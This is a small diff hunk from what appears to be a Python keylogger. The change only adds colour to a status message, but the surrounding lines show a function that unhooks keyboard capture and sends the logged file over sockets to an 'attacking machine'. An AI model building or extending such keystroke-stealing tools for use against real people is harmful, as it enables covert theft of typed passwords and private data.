@@ -53,7 +53,7 @@ def send_file_via_sockets(file, ip_address, port):
 
 
 def stop_script(ip_address, port,  file):
-    print('Sending file to attacking machine')
+    print(f'{green}Sending file to attacking machine{reset}')
     keyboard.unhook_all()
     send_file_via_sockets(file, ip_address, port)
 
